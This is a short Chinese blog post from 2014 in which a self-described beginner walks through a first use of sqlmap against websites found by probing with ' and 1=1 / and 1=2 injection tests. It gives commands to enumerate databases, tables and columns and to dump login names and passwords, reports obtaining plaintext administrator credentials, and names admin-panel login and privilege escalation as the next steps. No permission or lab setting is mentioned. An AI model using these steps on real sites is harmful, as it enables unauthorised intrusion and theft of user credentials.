title: '第一次使用sqlmap'
date: 2014-09-02 17:26
tags: sql注入
---

本人菜鸟一枚，第一次使用sqlmap，大神误入
准备工作：使用 '  and 1=1  and 1=2 找到可能存在sql注入的网站
<!--more-->

#（1）查看数据库系统信息

在终端输入
sqlmap -u url --dbs --current-user

说明：url 换成你之前找到的可能存在sql注入的网址 ，文中的url都是这样，不在赘述



![](http://img.blog.csdn.net/20140902162816652)






#（2）查看数据库表

sqlmap -u -url --tables  



![](http://img.blog.csdn.net/20140902163603858)





会出现一个错误，询问是否使用常用的表来 查询数据库表，选择 y
sqlmap 会加载常用的数据库表命名字典，使用其中的表名执行sql语句，判断数据库中是否存在相应的表名



![](http://img.blog.csdn.net/20140902163959578)





输入运行的线程数，这个数字任意



期间可能会出现请求超时的情况，不用管，sqlmap会自动再次请求，直接等结果
![](http://img.blog.csdn.net/20140902164217546)





查询出两张表，可能数据库中不止这两张表

#（3）查看表字段

sqlmap -u url -T uname --columns
说明：uname是上面查询出来的其中一张表
![](http://img.blog.csdn.net/20140902165805211)






#（4）查看数据

sqlmap -u -url -T uname -C login_name,pass,username --dump
![](http://img.blog.csdn.net/20140902172455071)





发现密码竟然是明文，得到管理员账号和密码了。。。。。。。
后续就是找后台地址，登录，然后继续提权，就不介绍了






